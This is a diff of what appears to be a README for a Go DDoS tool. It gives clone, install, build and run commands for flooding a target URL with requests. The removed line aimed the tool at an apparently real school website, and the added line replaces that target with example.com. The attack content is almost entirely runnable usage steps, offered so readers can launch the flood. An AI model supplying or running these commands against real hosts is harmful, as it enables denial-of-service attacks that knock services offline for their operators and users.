@@ -25,20 +25,24 @@ A DDoS attack aims to overwhelm the devices, services, and network of its intend
 setup=>👾
 
 
-step 1 >   git clone https://github.com/Sumitshah00/byteassassinsXddos.git
+step 1 >   'git clone https://github.com/Sumitshah00/byteassassinsXddos.git'
 
 
 
-step 2 >   cd byteassassinsXddos
+step 2 >   'cd byteassassinsXddos'
 
 
 
-step 3 >   go build byteassassinsXddos.go
+step 3 >  'pkg install golang'
 
 
 
 
-step 4 >  ./byteassassinsXddos https://suratschool.metasofsda.in/ 5000 get 1200 nil
+step 3 >   'go build byteassassinsXddos.go'
+
+
+
+step 4 >  './byteassassinsXddos https://example.com 5000 get 1200 nil'
 
 
 
@@ -50,6 +54,7 @@ step 4 >  ./byteassassinsXddos https://suratschool.metasofsda.in/ 5000 get 1200 
 
 ![image](https://github.com/Sumitshah00/byteassassinsXddos/assets/149252561/36721106-5581-405f-bef4-f71420f8c82a)
 
+![image](https://github.com/Sumitshah00/byteassassinsXddos/assets/149252561/2bbf01b7-f1c9-4851-8637-8a894d2042a2)
 
 
 
